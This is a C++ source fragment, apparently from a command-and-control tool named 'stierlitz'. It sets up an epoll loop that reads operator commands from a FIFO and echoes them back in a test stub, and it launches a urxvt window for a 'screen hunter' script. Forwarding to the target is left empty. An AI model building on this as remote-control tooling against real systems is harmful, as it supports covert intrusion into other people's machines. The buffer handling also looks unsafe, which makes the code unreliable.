#include "screen_hunter.hpp"

void ScreenHunter::exec_spy() {
    int rc;
    fifo_in_ = fifo_path_ + (std::string) "_in"; // screen hunter command line READ_ONLY

    int tunnel_fifo_in_ = open(fifo_in_.c_str(), O_RDONLY | O_NONBLOCK);
    if (tunnel_fifo_in_ < 0) {
        write_fifo_error("Error while opening the fifo path");
        return;
    }

    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
        return;
    }

    struct epoll_event screen_hunter_c2_event;
    screen_hunter_c2_event.data.fd = tunnel_fifo_in_;
    screen_hunter_c2_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_fifo_in_, &screen_hunter_c2_event) < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
        return;
    } 

    char command[1024] = {0};

    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);

        if (nfds < 0) {
            return;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                // Server shuts down
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                    close(tunnel_fifo_in_);
                }
                return;
            } else if (events[i].data.fd == tunnel_fifo_in_) {
                // Command from screen hunter. Forward the command to the tunnel_socket_
                rc = read(tunnel_fifo_in_, command, sizeof(command));
                if (rc <= 0) {
                    write_fifo_error("[SpyTunnel::run] Was unable to read command from tunnel_fifo_in_");
                    return;
                } 

                if (strncmp(command, "exit", 4) == 0) {
                    close(tunnel_fifo_);
                    close(tunnel_fifo_in_);
                    return ;
                }

                // TEST
                strncpy(command + rc, " RECEVEIED\0", 12);
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, command, rc + 12);
                }
            } else if (events[i].data.fd == tunnel_socket_) {
                // Data from the target
            }
        }
    }

    if (tunnel_fifo_in_ != -1) {
        close(tunnel_fifo_in_);
    }

}
void ScreenHunter::spawn_window() {
    execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_screen_hunter", "-e", SCREEN_HUNTER_SCRIPT_PATH, fifo_path_.c_str(), (char*)NULL);
}